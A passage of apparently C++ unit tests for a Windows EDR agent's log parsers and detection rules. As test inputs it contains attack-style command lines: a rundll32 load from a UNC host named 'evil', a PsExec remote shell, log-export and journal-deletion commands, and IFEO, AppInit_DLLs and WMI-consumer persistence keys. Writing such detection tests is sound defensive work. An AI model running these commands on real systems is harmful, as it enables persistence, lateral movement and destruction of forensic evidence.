    CHECK(ev.fields.at(field::kWmiEventId) == "5861");
    CHECK(ev.pid == 0); /* 5861 carries no Processid */
}

static void TestWmiParserInvalid() {
    Event event;
    CHECK(!ParseWmiXml(L"<Event><System></System></Event>", event));
    CHECK(!ParseWmiXml(WmiXml(5860,
        L"<Operation_TemporaryEssStarted><Query>unterminated"
        L"</Operation_TemporaryEssStarted>").c_str(), event));
    CHECK(!ParseWmiXml(WmiXml(5860,
        L"<Operation_TemporaryEssStarted><Query>value<Broken></Query>"
        L"</Operation_TemporaryEssStarted>").c_str(), event));
    CHECK(!ParseWmiXml(WmiXml(5860,
        L"<Operation_TemporaryEssStarted><Query>value</Query>"
        L"</Operation_TemporaryEssStarted>junk").c_str(), event));
}

static void TestWmiSemanticDedup() {
    SemanticDeduplicator dedup;
    Event first;
    first.type = EDR_EVT_WMI_EVENT;
    first.ts100ns = 10000000;
    first.processIdentity = "wmi/HOST/100";
    first.fields[field::kWmiEventId] = "5858";
    first.fields[field::kOperationType] = "CLIENT_FAILURE";
    first.fields[field::kWmiOperation] = "query one";
    first.fields[field::kWmiResultCode] = "0x80041032";
    CHECK(!dedup.IsDuplicate(first));

    Event duplicate = first;
    duplicate.ts100ns += 1000;
    CHECK(dedup.IsDuplicate(duplicate));

    Event different = duplicate;
    different.fields[field::kWmiOperation] = "query two";
    CHECK(!dedup.IsDuplicate(different));
}

static void TestWmiProductionRules() {
    RuleEngine engine;
    engine.LoadFromFile("..\\rules\\rules.json");
    std::vector<std::string> hits;
    engine.SetAlertCallback([&](const Alert& alert) { hits.push_back(alert.ruleId); });

    Event tempSub;
    tempSub.type = EDR_EVT_WMI_EVENT;
    tempSub.fields[field::kType] = "WMI_EVENT";
    tempSub.fields[field::kOperationType] = "TEMPORARY_EVENT_SUBSCRIPTION";
    tempSub.fields[field::kWmiQuery] = "select * from RegistryValueChangeEvent where Hive='HKEY_USERS'";
    engine.OnEvent(tempSub);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-023") != hits.end());

    hits.clear();
    tempSub.fields[field::kWmiQuery] = "select * from Win32_Processor";
    engine.OnEvent(tempSub);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-023") == hits.end());

    hits.clear();
    Event providerLoad;
    providerLoad.type = EDR_EVT_WMI_EVENT;
    providerLoad.fields[field::kType] = "WMI_EVENT";
    providerLoad.fields[field::kOperationType] = "PROVIDER_LOAD";
    providerLoad.fields[field::kWmiProviderPath] = "C:\\Users\\user\\AppData\\Local\\evil.dll";
    engine.OnEvent(providerLoad);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-024") != hits.end());

    hits.clear();
    providerLoad.fields[field::kWmiProviderPath] = "C:\\Windows\\System32\\wbem\\wmiprov.dll";
    engine.OnEvent(providerLoad);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-024") == hits.end());

    hits.clear();
    providerLoad.fields[field::kWmiProviderPath] =
        "C:\\ProgramData\\Microsoft\\VisualStudio\\SetupWMI\\x64\\provider.dll";
    engine.OnEvent(providerLoad);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-024") == hits.end());

    /* EDR-181: permanent event subscription (5859) with high-value query. */
    hits.clear();
    Event permSub;
    permSub.type = EDR_EVT_WMI_EVENT;
    permSub.fields[field::kType] = "WMI_EVENT";
    permSub.fields[field::kOperationType] = "PERMANENT_EVENT_SUBSCRIPTION";
    permSub.fields[field::kWmiQuery] = "select * from __InstanceCreationEvent within 10 where TargetInstance ISA \"CommandLineEventConsumer\"";
    engine.OnEvent(permSub);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-181") != hits.end());

    hits.clear();
    permSub.fields[field::kWmiQuery] = "select * from MSFT_SCMEventLogEvent";
    engine.OnEvent(permSub);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-181") == hits.end());

    /* EDR-182: filter-to-consumer binding (5861) with executable consumer. */
    hits.clear();
    Event binding;
    binding.type = EDR_EVT_WMI_EVENT;
    binding.fields[field::kType] = "WMI_EVENT";
    binding.fields[field::kOperationType] = "FILTER_TO_CONSUMER_BINDING";
    binding.fields[field::kWmiOperation] = "UPDATER";
    binding.fields[field::kWmiProviderName] = "CommandLineEventConsumer=\"cmd /c evil\"";
    engine.OnEvent(binding);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-182") != hits.end());

    hits.clear();
    binding.fields[field::kWmiProviderName] = "NTEventLogEventConsumer=\"SCM Event Log Consumer\"";
    engine.OnEvent(binding);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-182") == hits.end());
}

static void TestThinEventProductionRules() {
    RuleEngine engine;
    engine.LoadFromFile("..\\rules\\rules.json");
    std::vector<std::string> hits;
    engine.SetAlertCallback([&](const Alert& alert) { hits.push_back(alert.ruleId); });

    /* EDR-183: critical process recovered (terminated must not hit it). */
    hits.clear();
    Event critRecovered;
    critRecovered.type = EDR_EVT_CRITICAL_PROCESS;
    critRecovered.fields[field::kType] = "CRITICAL_PROCESS";
    critRecovered.fields[field::kCriticalProcessAction] = "recovered";
    critRecovered.fields[field::kCriticalProcessImage] = "lsass.exe";
    engine.OnEvent(critRecovered);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-183") != hits.end());

    hits.clear();
    critRecovered.fields[field::kCriticalProcessAction] = "terminated";
    engine.OnEvent(critRecovered);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-183") == hits.end());

    /* EDR-184: service removed (added must not hit it). */
    hits.clear();
    Event svcRemoved;
    svcRemoved.type = EDR_EVT_SERVICE_CHANGE;
    svcRemoved.fields[field::kType] = "SERVICE_CHANGE";
    svcRemoved.fields[field::kServiceAction] = "removed";
    svcRemoved.fields[field::kServiceName] = "EvilSvc";
    engine.OnEvent(svcRemoved);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-184") != hits.end());

    hits.clear();
    svcRemoved.fields[field::kServiceAction] = "added";
    engine.OnEvent(svcRemoved);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-184") == hits.end());

    /* EDR-186: password change/reset (4723/4724; ACCOUNT_CREATE must not hit). */
    hits.clear();
    Event pwReset;
    pwReset.type = EDR_EVT_ACCOUNT_CHANGE;
    pwReset.fields[field::kType] = "ACCOUNT_CHANGE";
    pwReset.fields[field::kOperationType] = "ACCOUNT_PASSWORD_CHANGE";
    pwReset.fields[field::kTargetUser] = "svc_backup";
    engine.OnEvent(pwReset);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-186") != hits.end());

    hits.clear();
    pwReset.fields[field::kOperationType] = "ACCOUNT_PASSWORD_RESET";
    engine.OnEvent(pwReset);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-186") != hits.end());

    hits.clear();
    pwReset.fields[field::kOperationType] = "ACCOUNT_CREATE";
    engine.OnEvent(pwReset);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-186") == hits.end());

    /* EDR-188: account locked out (4740). */
    hits.clear();
    pwReset.fields[field::kOperationType] = "ACCOUNT_LOCKED_OUT";
    engine.OnEvent(pwReset);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-188") != hits.end());

    /* EDR-190: account deleted (4726). */
    hits.clear();
    pwReset.fields[field::kOperationType] = "ACCOUNT_DELETED";
    engine.OnEvent(pwReset);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-190") != hits.end());

    hits.clear();
    pwReset.fields[field::kOperationType] = "ACCOUNT_ENABLED";
    engine.OnEvent(pwReset);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-190") == hits.end());

    /* EDR-189: USB removed (added must not hit it). */
    hits.clear();
    Event usbRemoved;
    usbRemoved.type = EDR_EVT_USB_DEVICE;
    usbRemoved.fields[field::kType] = "USB_DEVICE";
    usbRemoved.fields[field::kUsbAction] = "removed";
    engine.OnEvent(usbRemoved);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-189") != hits.end());

    hits.clear();
    usbRemoved.fields[field::kUsbAction] = "added";
    engine.OnEvent(usbRemoved);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-189") == hits.end());
}

static void TestNewEventTypeProductionRules() {
    RuleEngine engine;
    engine.LoadFromFile("..\\rules\\rules.json");
    std::vector<std::string> hits;
    engine.SetAlertCallback([&](const Alert& alert) { hits.push_back(alert.ruleId); });

    /* EDR-209: system directory file renamed (minifilter emits the OLD path
     * in file_path; EDR-193 already covers user-writable destinations). */
    hits.clear();
    Event rename;
    rename.type = EDR_EVT_FILE_RENAME;
    rename.fields[field::kType] = "FILE_RENAME";
    rename.fields[field::kFilePath] = "C:\\Windows\\System32\\evil.dll";
    engine.OnEvent(rename);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-209") != hits.end());

    hits.clear();
    rename.fields[field::kFilePath] = "C:\\Users\\user\\AppData\\Local\\Temp\\evil.dll";
    engine.OnEvent(rename);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-209") == hits.end());

    /* EDR-210: firewall rule removed. */
    hits.clear();
    Event fwRemoved;
    fwRemoved.type = EDR_EVT_FIREWALL_RULE;
    fwRemoved.fields[field::kType] = "FIREWALL_RULE";
    fwRemoved.fields[field::kFirewallAction] = "removed";
    engine.OnEvent(fwRemoved);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-210") != hits.end());

    hits.clear();
    fwRemoved.fields[field::kFirewallAction] = "added";
    engine.OnEvent(fwRemoved);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-210") == hits.end());

    /* EDR-214: thread handle opened with full-access decimal mask
     * (0x1F0000..0x1FFFFF = 2000000..2099999; THREAD_ALL_ACCESS=2032639).
     * Single low-value masks and process handles must not hit. */
    hits.clear();
    Event threadHandle;
    threadHandle.type = EDR_EVT_HANDLE_OPEN;
    threadHandle.fields[field::kType] = "HANDLE_OPEN";
    threadHandle.fields[field::kObjectType] = "thread";
    threadHandle.fields[field::kAccessMask] = "2032639"; /* THREAD_ALL_ACCESS */
    engine.OnEvent(threadHandle);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-214") != hits.end());

    hits.clear();
    threadHandle.fields[field::kAccessMask] = "64"; /* THREAD_QUERY_INFORMATION */
    engine.OnEvent(threadHandle);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-214") == hits.end());

    hits.clear();
    threadHandle.fields[field::kObjectType] = "process";
    threadHandle.fields[field::kAccessMask] = "2032639";
    engine.OnEvent(threadHandle);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-214") == hits.end());

    /* EDR-215: local user removed / modified. */
    hits.clear();
    Event userRemoved;
    userRemoved.type = EDR_EVT_LOCAL_ACCOUNT;
    userRemoved.fields[field::kType] = "LOCAL_ACCOUNT";
    userRemoved.fields[field::kAccountType] = "user";
    userRemoved.fields[field::kAccountAction] = "removed";
    engine.OnEvent(userRemoved);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-215") != hits.end());

    hits.clear();
    userRemoved.fields[field::kAccountAction] = "modified";
    engine.OnEvent(userRemoved);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-215") != hits.end());

    hits.clear();
    userRemoved.fields[field::kAccountAction] = "added";
    engine.OnEvent(userRemoved);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-215") == hits.end());

    /* EDR-216: local group membership removed. */
    hits.clear();
    Event groupRemoved;
    groupRemoved.type = EDR_EVT_LOCAL_ACCOUNT;
    groupRemoved.fields[field::kType] = "LOCAL_ACCOUNT";
    groupRemoved.fields[field::kAccountType] = "group";
    groupRemoved.fields[field::kGroupAction] = "removed";
    engine.OnEvent(groupRemoved);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-216") != hits.end());

    hits.clear();
    groupRemoved.fields[field::kGroupAction] = "added";
    engine.OnEvent(groupRemoved);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-216") == hits.end());
}

// ----- Kernel Callbacks Production Rules (EDR-153..EDR-162) -----

static void TestKernelCallbacksProductionRules() {
    RuleEngine engine;
    engine.LoadFromFile("..\\rules\\rules.json");
    std::vector<std::string> hits;
    engine.SetAlertCallback([&](const Alert& alert) { hits.push_back(alert.ruleId); });

    /* EDR-153: driver-source PROCESS_STOP of a critical system process. */
    Event stopCritical;
    stopCritical.type = EDR_EVT_PROCESS_STOP;
    stopCritical.fields[field::kType] = "PROCESS_STOP";
    stopCritical.fields[field::kSource] = "driver";
    stopCritical.fields[field::kImage] = "winlogon.exe";
    engine.OnEvent(stopCritical);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-153") != hits.end());

    hits.clear();
    /* Non-critical stop from the driver source must not hit. */
    stopCritical.fields[field::kImage] = "notepad.exe";
    engine.OnEvent(stopCritical);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-153") == hits.end());

    hits.clear();
    /* Non-driver source (ETW/poll has no image on PROCESS_STOP) must not hit. */
    stopCritical.fields[field::kSource] = "etw";
    stopCritical.fields[field::kImage] = "lsass.exe";
    engine.OnEvent(stopCritical);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-153") == hits.end());

    /* EDR-154: STATS with non-zero dropped_events. */
    hits.clear();
    Event statsOk;
    statsOk.type = EDR_EVT_STATS;
    statsOk.fields[field::kType] = "STATS";
    statsOk.fields[field::kDroppedEvents] = "0";
    engine.OnEvent(statsOk);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-154") == hits.end());

    hits.clear();
    Event statsDropped;
    statsDropped.type = EDR_EVT_STATS;
    statsDropped.fields[field::kType] = "STATS";
    statsDropped.fields[field::kDroppedEvents] = "3";
    engine.OnEvent(statsDropped);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-154") != hits.end());

    /* EDR-156: unsigned image loaded from a user-writable directory. */
    hits.clear();
    Event imgLoad;
    imgLoad.type = EDR_EVT_IMAGE_LOAD;
    imgLoad.fields[field::kType] = "IMAGE_LOAD";
    imgLoad.fields[field::kSignatureStatus] = "unsigned_embedded";
    imgLoad.fields[field::kTargetImage] = "C:\\Users\\user\\AppData\\Local\\Temp\\evil.dll";
    engine.OnEvent(imgLoad);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-156") != hits.end());

    hits.clear();
    imgLoad.fields[field::kTargetImage] = "C:\\Windows\\System32\\kernel32.dll";
    engine.OnEvent(imgLoad);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-156") == hits.end());

    /* EDR-159: IFEO Debugger on accessibility tools (driver reg_key + value-name). */
    hits.clear();
    Event ifeo;
    ifeo.type = EDR_EVT_REG_WRITE;
    ifeo.fields[field::kType] = "REG_WRITE";
    ifeo.fields[field::kRegKey] =
        "\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\"
        "Image File Execution Options\\sethc.exe";
    ifeo.fields[field::kRegValue] = "Debugger";
    engine.OnEvent(ifeo);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-159") != hits.end());

    /* EDR-160: AppInit_DLLs write under Windows NT\\CurrentVersion\\Windows. */
    hits.clear();
    Event appInit;
    appInit.type = EDR_EVT_REG_WRITE;
    appInit.fields[field::kType] = "REG_WRITE";
    appInit.fields[field::kRegKey] =
        "\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows";
    appInit.fields[field::kRegValue] = "AppInit_DLLs";
    engine.OnEvent(appInit);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-160") != hits.end());

    /* EDR-161: LSA SecurityPackages write. */
    hits.clear();
    Event lsa;
    lsa.type = EDR_EVT_REG_WRITE;
    lsa.fields[field::kType] = "REG_WRITE";
    lsa.fields[field::kRegKey] =
        "\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\SecurityPackages";
    engine.OnEvent(lsa);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-161") != hits.end());

    /* EDR-162: COM CLSID InProcServer32 write. */
    hits.clear();
    Event clsid;
    clsid.type = EDR_EVT_REG_WRITE;
    clsid.fields[field::kType] = "REG_WRITE";
    clsid.fields[field::kRegKey] =
        "\\REGISTRY\\MACHINE\\SOFTWARE\\Classes\\CLSID\\{11111111-2222-3333-4444-555555555555}\\InProcServer32";
    engine.OnEvent(clsid);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-162") != hits.end());
}

static void TestLateralMovementProductionRules() {
    RuleEngine engine;
    engine.LoadFromFile("..\\rules\\rules.json");
    std::vector<std::string> hits;
    engine.SetAlertCallback([&](const Alert& alert) { hits.push_back(alert.ruleId); });

    /* EDR-163: wmiprvse.exe start (image-only, no parent_image dependency).
     * ETW source stores a full path; poll stores a basename — both must hit. */
    hits.clear();
    Event wmiprvse;
    wmiprvse.type = EDR_EVT_PROCESS_START;
    wmiprvse.fields[field::kType] = "PROCESS_START";
    wmiprvse.fields[field::kImage] = "C:\\Windows\\System32\\wbem\\wmiprvse.exe";
    engine.OnEvent(wmiprvse);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-163") != hits.end());

    hits.clear();
    wmiprvse.fields[field::kImage] = "wmiprvse.exe"; /* poll basename */
    engine.OnEvent(wmiprvse);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-163") != hits.end());

    hits.clear();
    wmiprvse.fields[field::kImage] = "notepad.exe";
    engine.OnEvent(wmiprvse);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-163") == hits.end());

    /* Prefix-boundary negative: wmiprvse32.exe must NOT match wmiprvse\.exe$ —
     * guards the (^|[\\/])...\.exe$ shape against a sloppy unanchored variant. */
    hits.clear();
    wmiprvse.fields[field::kImage] = "wmiprvse32.exe";
    engine.OnEvent(wmiprvse);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-163") == hits.end());

    /* EDR-164: outbound WinRM 5985/5986. */
    hits.clear();
    Event winrm;
    winrm.type = EDR_EVT_NET_CONNECT;
    winrm.fields[field::kType] = "NET_CONNECT";
    winrm.fields[field::kDstPort] = "5985";
    engine.OnEvent(winrm);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-164") != hits.end());

    hits.clear();
    winrm.fields[field::kDstPort] = "5986";
    engine.OnEvent(winrm);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-164") != hits.end());

    hits.clear();
    winrm.fields[field::kDstPort] = "443";
    engine.OnEvent(winrm);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-164") == hits.end());

    /* EDR-165: net use/session/share (net user must not hit; EDR-149 covers it). */
    hits.clear();
    Event netUse;
    netUse.type = EDR_EVT_PROCESS_START;
    netUse.fields[field::kType] = "PROCESS_START";
    netUse.fields[field::kCommandLine] = "net use \\\\server\\share";
    engine.OnEvent(netUse);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-165") != hits.end());

    hits.clear();
    netUse.fields[field::kCommandLine] = "net user bob";
    engine.OnEvent(netUse);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-165") == hits.end());

    /* EDR-167: rundll32 with UNC/http argument. */
    hits.clear();
    Event rundll32;
    rundll32.type = EDR_EVT_PROCESS_START;
    rundll32.fields[field::kType] = "PROCESS_START";
    rundll32.fields[field::kImage] = "rundll32.exe";
    rundll32.fields[field::kCommandLine] = "rundll32.exe \\\\evil\\payload.dll,entry";
    engine.OnEvent(rundll32);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-167") != hits.end());

    hits.clear();
    rundll32.fields[field::kCommandLine] = "rundll32.exe C:\\Windows\\System32\\x.dll,a";
    engine.OnEvent(rundll32);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-167") == hits.end());

    /* EDR-169: psexec in command line. */
    hits.clear();
    Event psexec;
    psexec.type = EDR_EVT_PROCESS_START;
    psexec.fields[field::kType] = "PROCESS_START";
    psexec.fields[field::kCommandLine] = "PsExec.exe -s \\\\target cmd.exe";
    engine.OnEvent(psexec);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-169") != hits.end());

    hits.clear();
    psexec.fields[field::kCommandLine] = "notepad.exe";
    engine.OnEvent(psexec);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-169") == hits.end());

    /* EDR-170: successful network logon type 3 (4624). */
    hits.clear();
    Event netLogon;
    netLogon.type = EDR_EVT_LOGON;
    netLogon.fields[field::kType] = "LOGON";
    netLogon.fields[field::kOperationType] = "LOGON";
    netLogon.fields[field::kLogonType] = "3";
    engine.OnEvent(netLogon);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-170") != hits.end());

    hits.clear();
    netLogon.fields[field::kOperationType] = "LOGON_FAILURE";
    engine.OnEvent(netLogon);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-170") == hits.end());

    hits.clear();
    netLogon.fields[field::kOperationType] = "LOGON";
    netLogon.fields[field::kLogonType] = "2";
    engine.OnEvent(netLogon);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-170") == hits.end());
}

static void TestAntiForensicsProductionRules() {
    RuleEngine engine;
    engine.LoadFromFile("..\\rules\\rules.json");
    std::vector<std::string> hits;
    engine.SetAlertCallback([&](const Alert& alert) { hits.push_back(alert.ruleId); });

    /* EDR-172: audit log cleared (1102). EDR-173: log service shutdown (1100). */
    hits.clear();
    Event auditClear;
    auditClear.type = EDR_EVT_AUDIT_LOG;
    auditClear.fields[field::kType] = "AUDIT_LOG";
    auditClear.fields[field::kAuditLogEventId] = "1102";
    engine.OnEvent(auditClear);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-172") != hits.end());
    CHECK(std::find(hits.begin(), hits.end(), "EDR-173") == hits.end());

    hits.clear();
    auditClear.fields[field::kAuditLogEventId] = "1100";
    engine.OnEvent(auditClear);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-173") != hits.end());
    CHECK(std::find(hits.begin(), hits.end(), "EDR-172") == hits.end());

    /* EDR-174: attrib +h. */
    hits.clear();
    Event attrib;
    attrib.type = EDR_EVT_PROCESS_START;
    attrib.fields[field::kType] = "PROCESS_START";
    attrib.fields[field::kCommandLine] = "attrib +h C:\\secret.txt";
    engine.OnEvent(attrib);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-174") != hits.end());

    hits.clear();
    attrib.fields[field::kCommandLine] = "attrib -h C:\\secret.txt";
    engine.OnEvent(attrib);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-174") == hits.end());

    /* EDR-175: icacls. EDR-176: takeown. */
    hits.clear();
    Event icacls;
    icacls.type = EDR_EVT_PROCESS_START;
    icacls.fields[field::kType] = "PROCESS_START";
    icacls.fields[field::kCommandLine] = "icacls C:\\secret /grant everyone:F";
    engine.OnEvent(icacls);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-175") != hits.end());

    hits.clear();
    Event takeown;
    takeown.type = EDR_EVT_PROCESS_START;
    takeown.fields[field::kType] = "PROCESS_START";
    takeown.fields[field::kCommandLine] = "takeown /f C:\\secret";
    engine.OnEvent(takeown);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-176") != hits.end());

    /* EDR-177: cipher /w. */
    hits.clear();
    Event cipher;
    cipher.type = EDR_EVT_PROCESS_START;
    cipher.fields[field::kType] = "PROCESS_START";
    cipher.fields[field::kCommandLine] = "cipher /w:C:\\";
    engine.OnEvent(cipher);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-177") != hits.end());

    hits.clear();
    cipher.fields[field::kCommandLine] = "cipher /u";
    engine.OnEvent(cipher);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-177") == hits.end());

    /* EDR-178: fsutil usn deletejournal. */
    hits.clear();
    Event fsutil;
    fsutil.type = EDR_EVT_PROCESS_START;
    fsutil.fields[field::kType] = "PROCESS_START";
    fsutil.fields[field::kCommandLine] = "fsutil usn deletejournal /d C:";
    engine.OnEvent(fsutil);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-178") != hits.end());

    hits.clear();
    fsutil.fields[field::kCommandLine] = "fsutil usn queryjournal C:";
    engine.OnEvent(fsutil);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-178") == hits.end());

    /* EDR-179: wevtutil epl. */
    hits.clear();
    Event epl;
    epl.type = EDR_EVT_PROCESS_START;
    epl.fields[field::kType] = "PROCESS_START";
    epl.fields[field::kCommandLine] = "wevtutil epl Security C:\\out.evtx";
    engine.OnEvent(epl);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-179") != hits.end());

    hits.clear();
    epl.fields[field::kCommandLine] = "wevtutil cl Security";
    engine.OnEvent(epl);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-179") == hits.end());
}


// ----- TaskScheduler Parser Tests -----

static std::wstring TaskXml(unsigned int id, const wchar_t* data,
        const wchar_t* systemTime = L"2026-07-31T09:00:00.1234567Z") {
    return L"<Event><System><EventID>" + std::to_wstring(id) +
           L"</EventID><TimeCreated SystemTime='" + systemTime +
           L"'/></System><EventData>" + data + L"</EventData></Event>";
}

static Event ParseTask(const wchar_t* xml) {
    Event event;
    CHECK(ParseTaskSchedulerXml(xml, event));
    return event;
}

static void TestTaskSchedulerParser106() {
    Event ev = ParseTask(TaskXml(106,
        L"<Data Name='TaskName'>\\Updater\\evil</Data>"
        L"<Data Name='UserContext'>DESKTOP-TEST\\user</Data>").c_str());
    CHECK(ev.type == EDR_EVT_TASK_SCHEDULER);
    CHECK(ev.source == "taskscheduler_log");
    CHECK(ev.fields.at(field::kType) == "TASK_SCHEDULER");
    CHECK(ev.fields.at(field::kOperationType) == "TASK_REGISTERED");
    CHECK(ev.fields.at(field::kTaskName) == "\\Updater\\evil");
    CHECK(ev.fields.at(field::kTaskUserContext) == "DESKTOP-TEST\\user");
    CHECK(ev.fields.at(field::kTaskSchedulerEventId) == "106");
    CHECK(ev.fields.at(field::kSourceTimestamp) == "2026-07-31T09:00:00.1234567Z");
    CHECK(ev.fields.at(field::kTimestampProvenance) == "taskscheduler_system_time");
    SYSTEMTIME expected = {2026, 7, 0, 31, 9, 0, 0, 0};
    FILETIME expectedFileTime = {};
    CHECK(SystemTimeToFileTime(&expected, &expectedFileTime));
    uint64_t expected100ns =
        (static_cast<uint64_t>(expectedFileTime.dwHighDateTime) << 32) |
        expectedFileTime.dwLowDateTime;
    CHECK(ev.ts100ns == expected100ns + 1234567);
}

static void TestTaskSchedulerParser140() {
    Event ev = ParseTask(TaskXml(140,
        L"<Data Name='TaskName'>\\Corp\\backup</Data>"
        L"<Data Name='UserName'>CORP\\svc-backup</Data>").c_str());
    CHECK(ev.type == EDR_EVT_TASK_SCHEDULER);
    CHECK(ev.fields.at(field::kType) == "TASK_SCHEDULER");
    CHECK(ev.fields.at(field::kOperationType) == "TASK_UPDATED");
    CHECK(ev.fields.at(field::kTaskName) == "\\Corp\\backup");
    /* UserName is the fallback when UserContext is absent. */
    CHECK(ev.fields.at(field::kTaskUserContext) == "CORP\\svc-backup");
    CHECK(ev.fields.at(field::kTaskSchedulerEventId) == "140");
    CHECK(ev.fields.at(field::kTimestampProvenance) == "taskscheduler_system_time");
}

static void TestTaskSchedulerParser141() {
    Event ev = ParseTask(TaskXml(141,
        L"<Data Name='TaskName'>\\Corp\\old</Data>"
        L"<Data Name='UserContext'>NT AUTHORITY\\SYSTEM</Data>").c_str());
    CHECK(ev.type == EDR_EVT_TASK_SCHEDULER);
    CHECK(ev.fields.at(field::kOperationType) == "TASK_DELETED");
    CHECK(ev.fields.at(field::kTaskName) == "\\Corp\\old");
    CHECK(ev.fields.at(field::kTaskUserContext) == "NT AUTHORITY\\SYSTEM");
    CHECK(ev.fields.at(field::kTaskSchedulerEventId) == "141");
}

static void TestTaskSchedulerParserInvalid() {
    Event event;
    CHECK(!ParseTaskSchedulerXml(TaskXml(100,
        L"<Data Name='TaskName'>\\x</Data>").c_str(), event));
    CHECK(!ParseTaskSchedulerXml(TaskXml(200,
        L"<Data Name='TaskName'>\\x</Data>").c_str(), event));
    CHECK(!ParseTaskSchedulerXml(L"<Event><System></System></Event>", event));
    CHECK(!ParseTaskSchedulerXml(
        L"<Event><System><EventID>abc</EventID></System></Event>", event));
    /* Malformed EventData is tolerated: TaskName is simply absent. */
    Event partial = ParseTask(TaskXml(106,
        L"<Data Name='TaskName'>\\unterminated").c_str());
    CHECK(partial.type == EDR_EVT_TASK_SCHEDULER);
    CHECK(partial.fields.find(field::kTaskName) == partial.fields.end());
    /* A bad source timestamp falls back to collector time. */
    Event badTime = ParseTask(TaskXml(141,
        L"<Data Name='TaskName'>\\x</Data>", L"not-a-time").c_str());
    CHECK(badTime.ts100ns != 0);
    CHECK(badTime.fields.at(field::kTimestampProvenance) ==
          "collector_time_fallback");
}

static void WriteTaskSchedulerConfig(const char* data) {
    std::ofstream out("edr-native-taskscheduler-config.json", std::ios::binary);
    out << data;
}

static void TestTaskSchedulerConfigStrictAtomic() {
    std::string error;
    Config config;
    WriteTaskSchedulerConfig(R"({"enable_taskscheduler_log":true,"taskscheduler_queue_capacity":64,"taskscheduler_workers":8,"taskscheduler_max_xml_bytes":4096})");
    CHECK(LoadConfigFile("edr-native-taskscheduler-config.json", config, error));
    CHECK(config.enableTaskSchedulerLog && config.taskSchedulerQueueCapacity == 64 &&
          config.taskSchedulerWorkers == 8 && config.taskSchedulerMaxXmlBytes == 4096);
    for (const char* value : {
        R"({"enable_taskscheduler_log":"true"})",
        R"({"taskscheduler_queue_capacity":63})",
        R"({"taskscheduler_queue_capacity":8193})",
        R"({"taskscheduler_queue_capacity":512.5})",
        R"({"taskscheduler_workers":0})",
        R"({"taskscheduler_workers":9})",
        R"({"taskscheduler_max_xml_bytes":4095})",
        R"({"taskscheduler_max_xml_bytes":262145})",
        R"({"enable_taskscheduler_log":true,"enable_taskscheduler_log":false})"}) {
        WriteTaskSchedulerConfig(value);
        Config unchanged;
        unchanged.taskSchedulerWorkers = 7;
        CHECK(!LoadConfigFile("edr-native-taskscheduler-config.json", unchanged, error));
        CHECK(!unchanged.enableTaskSchedulerLog &&
              unchanged.taskSchedulerWorkers == 7);
    }
